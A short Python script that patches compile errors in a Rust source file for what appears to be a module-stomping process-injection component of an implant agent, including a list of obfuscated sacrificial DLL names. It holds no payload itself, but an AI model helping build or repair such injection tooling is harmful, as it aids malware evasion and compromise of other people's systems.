import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# E0308: mismatched types, expected array size 10, found 13, etc
# Just turn the macro output into a `&[u8]` properly so they can all fit in the same Vec.
text = text.replace('''enc_str!("msfte.dll"),
                enc_str!("msratelc.dll"),
                enc_str!("scrobj.dll"),
                enc_str!("amstream.dll")''', '''
                enc_str!("msfte.dll").as_ref(),
                enc_str!("msratelc.dll").as_ref(),
                enc_str!("scrobj.dll").as_ref(),
                enc_str!("amstream.dll").as_ref()
''')

# Also fix the encode_utf16 errors that I tried to fix previously and got rolled back
text = text.replace('let mut target_dll_w: Vec<u16> = target_dll.encode_utf16().chain(std::iter::once(0)).collect();', '''
                let target_dll_str = std::str::from_utf8(target_dll).unwrap_or("");
                let target_dll_w: Vec<u16> = target_dll_str.encode_utf16().chain(std::iter::once(0)).collect();
''')

text = text.replace('if name_str.contains(&target_dll.to_lowercase()) {', 'if name_str.contains(&target_dll_str.to_lowercase()) {')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

